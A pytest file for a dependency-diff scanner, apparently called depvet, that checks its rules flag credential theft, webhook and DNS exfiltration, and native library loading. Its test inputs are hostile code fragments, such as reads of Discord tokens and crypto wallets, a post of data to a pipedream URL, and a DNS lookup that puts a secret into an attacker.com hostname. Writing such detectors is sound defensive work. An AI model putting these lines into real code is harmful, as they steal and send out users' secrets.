"""Tests for extended detection rules (Types 7/8/10)."""

from depvet.analyzer.rules import scan_diff_full


def make_diff(lines, path="test.py"):
    header = [f"--- a/{path}", f"+++ b/{path}", f"@@ -1 +1,{len(lines)} @@"]
    return "\n".join(header + [f"+{line}" for line in lines])


# ─── Type 7: Credential harvesting ────────────────────────────────────────


class TestCredentialHarvesting:
    def test_discord_token_access(self):
        diff = make_diff(
            [
                "import os",
                "path = os.path.expanduser('~/.config/discord/Local Storage/leveldb')",
            ]
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DISCORD_TOKEN_THEFT" for r in m)

    def test_crypto_wallet_dat(self):
        diff = make_diff(["data = open('wallet.dat', 'rb').read()"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_crypto_ethereum_dir(self):
        diff = make_diff(["path = os.path.expanduser('~/.ethereum/keystore')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_metamask_access(self):
        diff = make_diff(["ext = 'metamask'", "data = read_extension(ext)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_keychain_access(self):
        diff = make_diff(["data = security find-generic-password -ga Chrome"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "KEYCHAIN_ACCESS" for r in m)


# ─── Webhook exfil expansion ──────────────────────────────────────────────


class TestWebhookExfil:
    def test_pipedream(self):
        diff = make_diff(["requests.post('https://eo1234.m.pipedream.net', json=data)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_ngrok(self):
        diff = make_diff(["url = 'https://abc123.ngrok.io/collect'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_ngrok_free_app(self):
        diff = make_diff(["url = 'https://abc.ngrok-free.app/hook'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_interactsh(self):
        diff = make_diff(["url = 'https://abc123.interact.sh'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_webhook_site(self):
        diff = make_diff(["url = 'https://webhook.site/abc-123'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_burp_collaborator(self):
        diff = make_diff(["url = 'https://abc.burpcollaborator.net'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_requestbin(self):
        diff = make_diff(["url = 'https://requestbin.com/abc'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_no_false_positive_github(self):
        diff = make_diff(["url = 'https://github.com/user/repo'"])
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)


# ─── Type 8: DNS exfiltration ─────────────────────────────────────────────


class TestDNSExfiltration:
    def test_dns_resolve_call(self):
        diff = make_diff(["dns.resolve(f'{secret}.attacker.com', callback)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)

    def test_dns_lookup_call(self):
        diff = make_diff(["dns.lookup(hostname, callback)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)

    def test_no_false_positive_normal_dns(self):
        """Normal code without dns. prefix should not trigger."""
        diff = make_diff(["hostname = 'api.example.com'"])
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)


# ─── Type 10: Native binding injection ────────────────────────────────────


class TestNativeBindingInjection:
    def test_binding_gyp(self):
        diff = make_diff(["binding.gyp file added"], "binding.gyp")
        m = scan_diff_full(diff, "binding.gyp")
        assert any(r.rule_id == "BINDING_GYP_ADDED" for r in m)

    def test_node_pre_gyp(self):
        diff = make_diff(["const prebuild = require('node-pre-gyp')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "BINDING_GYP_ADDED" for r in m)

    def test_ctypes_cdll(self):
        diff = make_diff(["lib = ctypes.CDLL('./libpayload.so')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)

    def test_dlopen(self):
        diff = make_diff(["handle = dlopen('./evil.so', RTLD_NOW)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)

    def test_ffi_library(self):
        diff = make_diff(["lib = ffi.Library('libcrypto', {...})"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)


# ─── Pattern count ────────────────────────────────────────────────────────


def test_total_patterns_at_least_35():
    from depvet.analyzer.rules import MALICIOUS_PATTERNS

    assert len(MALICIOUS_PATTERNS) >= 35
